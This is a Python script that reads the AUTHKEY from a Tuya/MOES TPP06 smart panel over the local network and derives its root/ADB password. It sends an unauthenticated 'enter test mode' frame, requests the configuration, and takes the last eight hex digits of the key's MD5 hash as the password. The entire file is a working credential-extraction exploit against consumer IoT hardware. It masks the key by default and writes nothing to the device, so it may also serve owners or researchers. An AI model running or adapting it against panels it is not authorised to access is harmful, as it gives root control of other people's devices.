#!/usr/bin/env python3
"""Read a TPP06 AUTHKEY over the local network without modifying the panel."""

from __future__ import annotations

import argparse
import hashlib
import json
import socket
from typing import Any


MAGIC = b"\x55\xaa"
DEFAULT_PORT = 8090


def build_frame(command: int, payload: bytes = b"") -> bytes:
    if not 0 <= command <= 0xFF:
        raise ValueError("command must fit in one byte")
    if len(payload) > 0xFFFF:
        raise ValueError("payload is too large")

    frame = MAGIC + bytes((0x00, command)) + len(payload).to_bytes(2, "big") + payload
    return frame + bytes((sum(frame) & 0xFF,))


def receive_frame(connection: socket.socket) -> tuple[int, bytes]:
    data = bytearray()
    while len(data) < 6:
        chunk = connection.recv(4096)
        if not chunk:
            raise ConnectionError("the panel closed the connection")
        data.extend(chunk)

    if data[:2] != MAGIC:
        raise ValueError("unexpected frame header")

    payload_length = int.from_bytes(data[4:6], "big")
    frame_length = 7 + payload_length
    while len(data) < frame_length:
        chunk = connection.recv(4096)
        if not chunk:
            raise ConnectionError("incomplete response from the panel")
        data.extend(chunk)

    frame = bytes(data[:frame_length])
    if (sum(frame[:-1]) & 0xFF) != frame[-1]:
        raise ValueError("invalid response checksum")

    return frame[3], frame[6 : 6 + payload_length].rstrip(b"\x00")


def read_configuration(host: str, port: int, timeout: float) -> dict[str, Any]:
    enter_test_mode = build_frame(0x00, b'{"action":"enter"}')
    read_configuration_frame = build_frame(0x04)

    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.settimeout(timeout)

        # Temporary, in-memory product-test state. It is cleared by a reboot.
        connection.sendall(enter_test_mode)
        enter_command, _ = receive_frame(connection)
        if enter_command != 0x00:
            raise ValueError(f"unexpected enter response command: 0x{enter_command:02x}")

        connection.sendall(read_configuration_frame)
        response_command, payload = receive_frame(connection)
        if response_command != 0x04:
            raise ValueError(f"unexpected read response command: 0x{response_command:02x}")

    parsed = json.loads(payload.decode("utf-8"))
    if not isinstance(parsed, dict):
        raise ValueError("the panel returned an unexpected JSON value")
    return parsed


def mask_secret(value: str) -> str:
    if len(value) < 8:
        return "<absent>" if not value else "****"
    return f"{value[:4]}…{value[-4:]}"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Read a Tuya/MOES TPP06 AUTHKEY and derive its root password."
    )
    parser.add_argument("host", help="panel IPv4 address or hostname")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=float, default=5.0)
    parser.add_argument(
        "--show-authkey",
        action="store_true",
        help="print the complete AUTHKEY (sensitive; masked by default)",
    )
    args = parser.parse_args()

    try:
        configuration = read_configuration(args.host, args.port, args.timeout)
    except (OSError, ValueError, json.JSONDecodeError) as error:
        parser.exit(1, f"error: {error}\n")

    authkey = str(configuration.get("auzkey") or configuration.get("authkey") or "")
    if not authkey:
        parser.exit(1, "error: the response did not contain an AUTHKEY\n")

    root_password = hashlib.md5(authkey.encode("utf-8")).hexdigest()[-8:]
    displayed_authkey = authkey if args.show_authkey else mask_secret(authkey)

    print(f"Panel: {args.host}:{args.port}")
    print(f"AUTHKEY: {displayed_authkey}")
    print(f"Root/ADB password: {root_password}")
    print("No persistent write or reboot was requested.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
